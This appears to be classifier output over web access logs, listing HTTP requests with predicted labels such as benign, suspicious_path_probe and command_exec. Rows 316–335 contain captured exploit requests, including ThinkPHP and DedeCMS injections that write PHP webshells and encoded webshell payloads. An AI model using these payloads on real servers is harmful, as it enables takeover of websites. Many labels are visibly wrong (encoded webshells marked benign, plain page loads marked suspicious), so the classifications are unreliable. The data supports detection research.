238,METHOD=GET PATH=/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7431632280349731
239,METHOD=GET PATH=/self.logs/error.log.2019-09-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4096969962120056
240,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
241,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
242,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
243,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
244,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
245,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
246,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
247,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
248,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
249,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
250,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
251,METHOD=GET PATH=/self.logs/access.log.2019-01-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45979568362236023
252,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
253,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
254,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
255,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.4974004030227661
256,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.4688447117805481
257,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.4933105707168579
258,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.4917145073413849
259,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.5004051923751831
260,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.4963632822036743
261,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634
262,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.48196008801460266
263,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.480240136384964
264,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.48653101921081543
265,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
266,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
267,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
268,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4098285138607025
269,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
270,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4082556962966919
271,METHOD=GET PATH=/self.logs/2015/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43429169058799744
272,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
273,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4384268522262573
274,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4483668804168701
275,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4019940197467804
276,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44058606028556824
277,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
278,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4070121645927429
279,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40792790055274963
280,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42459577322006226
281,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40308234095573425
282,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.39524802565574646
283,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3962686061859131
284,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4135914444923401
285,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.393920361995697
286,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43751388788223267
287,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4450225234031677
288,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3942822217941284
289,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4375974237918854
290,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4225592315196991
291,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4275737702846527
292,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38818758726119995
293,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42012807726860046
294,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
295,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
296,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681
297,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067
298,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377134680747986
299,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
300,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
301,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
302,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
303,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
304,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
305,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
306,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
307,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
308,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
309,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
310,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
311,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
312,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
313,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
314,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
315,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
316,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=%2F PROTOCOL=HTTP/1.1,command_exec,0.6429962515830994
317,METHOD=GET PATH=/index.php QUERY=m=member&c=index&a=register&siteid=1 PROTOCOL=HTTP/1.1,command_exec,0.42297330498695374
318,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744
319,METHOD=GET PATH=/plus/moon.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44791358709335327
320,METHOD=POST PATH=/plus/90sec.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.42047426104545593
321,METHOD=POST PATH=/utility/convert/index.php QUERY=a=config&source=d7.2_x2.0 PROTOCOL=HTTP/1.1,command_exec,0.5237575173377991
322,METHOD=POST PATH=/utility/convert/data/config.inc.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.547547459602356
323,METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// PROTOCOL=HTTP/1.1,command_exec,0.8581370711326599
324,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec,0.8373600840568542
325,METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623397171497345
326,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785
327,METHOD=POST PATH=/fdgq.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.45104455947875977
328,"METHOD=GET PATH=/ QUERY=s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E PROTOCOL=HTTP/1.1",command_exec,0.7207354307174683
329,METHOD=POST PATH=/ppeeu.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45686331391334534
330,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785
331,METHOD=POST PATH=/ysyqq.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41941767930984497
332,"METHOD=GET PATH=/ QUERY=s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ PROTOCOL=HTTP/1.1",command_exec,0.6881241798400879
333,METHOD=POST PATH=/txual.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44853901863098145
334,METHOD=GET PATH=/plus/mytag_js.php QUERY=dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 PROTOCOL=HTTP/1.1,benign,0.48952075839042664
335,METHOD=GET PATH=/plus/download.php QUERY=open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar PROTOCOL=HTTP/1.1,benign,0.4624825716018677
336,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744
337,METHOD=POST PATH=/e/DoInfo/ecms.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.4350149929523468
338,METHOD=GET PATH=/self.logs/access.log.2017-06-01.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4621824622154236
339,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
340,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
341,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
342,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
343,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
344,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
345,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
346,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
347,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
348,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
349,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
350,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
351,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
352,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
353,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
354,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
355,METHOD=GET PATH=/self.logs/error.log.2020-02-20 QUERY= PROTOCOL=HTTP/1.1,benign,0.4985811412334442
356,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
357,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634
358,METHOD=GET PATH=/js/comment.css QUERY= PROTOCOL=HTTP/1.1,benign,0.4877049922943115
359,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
360,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
361,METHOD=GET PATH=/self.logs/access.log.2021-10-03.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45221012830734253
362,METHOD=GET PATH=/self.logs/error.log.2021-10-03.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42285412549972534
363,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
364,METHOD=GET PATH=/self.logs/access.log.2021-10-04.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45710331201553345
365,METHOD=GET PATH=/self.logs/access.log.2021-03-16.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43653756380081177
366,METHOD=GET PATH=/self.logs/error.log.2021-10-04.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4219733774662018
367,METHOD=GET PATH=/self.logs/access.log.2017-03-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44875040650367737
368,METHOD=GET PATH=/self.logs/access.log.2018-03-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45323556661605835
369,METHOD=GET PATH=/self.logs/error.log.2019-05-19.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42895588278770447
370,METHOD=GET PATH=/self.logs/error.log.2020-07-17 QUERY= PROTOCOL=HTTP/1.1,benign,0.5123015642166138
371,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
372,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
373,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
374,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
375,METHOD=GET PATH=/auth.log/auth.log.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5544108152389526
376,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
377,METHOD=HEAD PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6294333338737488
378,METHOD=GET PATH=/tg/tg_snort_full.7z QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4479665458202362
379,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
380,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
381,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
382,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
383,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
384,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
385,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
386,METHOD=GET PATH=/self.logs/error.log.2021-03-22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5126395225524902
387,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
388,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
389,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
390,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
391,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
392,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
393,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
394,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
395,METHOD=GET PATH=/misc/zeus_dga_domains.txt.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6757688522338867
396,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
397,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.0,benign,0.5511705279350281
398,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5995742082595825
399,METHOD=GET PATH=/Datasets%20Description/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.44596144556999207
400,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
401,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
402,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
403,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
404,METHOD=GET PATH=/Datasets%20Description/ QUERY= PROTOCOL=HTTP/1.1,benign,0.4402334690093994
405,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.5944873094558716
406,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5944585800170898
407,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.6243715882301331
408,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5928223133087158
409,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6336460113525391
410,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6225396394729614
411,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6127139329910278
412,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
413,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6414214372634888
414,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.600266695022583
415,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6026156544685364
